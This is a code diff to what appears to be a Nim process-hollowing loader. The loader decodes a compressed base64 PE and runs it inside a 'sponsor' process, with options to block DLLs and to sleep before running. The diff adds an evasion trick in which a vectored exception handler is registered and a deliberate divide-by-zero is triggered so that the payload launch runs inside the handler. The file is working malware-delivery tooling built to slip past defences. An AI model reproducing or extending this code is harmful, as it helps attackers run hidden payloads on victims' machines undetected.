@@ -19,6 +19,14 @@ when defined(hollow4):
 when defined(hollow5) or defined(hollow6):
     import hollow56
 
+# Raising VEH
+{.emit: """
+#include <windows.h>
+void raiseVEH() {
+    int x = 4 / 0;
+}
+""".}
+proc raiseVEH(): void {.importc: "raiseVEH", nodecl.}
 
 proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
     # Decode and decompress PE
@@ -64,13 +72,22 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
         return hollow56Manager(peStr, ppi)
 
 
-proc main*() =
+proc wrap_execute() =
     discard execute(
         compressedBase64PE = compressedBase64PE, 
         sponsorCmd = sponsorPath & sponsorParams,
         isBlockDlls = isBlockDlls,
         sleepSeconds = sleepSeconds
     )
+    quit(0)
+
+
+proc main*() =
+    if isVeh:
+        AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](wrap_execute))
+        raiseVEH()
+    else:
+        wrap_execute()
 
 
 when isMainModule:
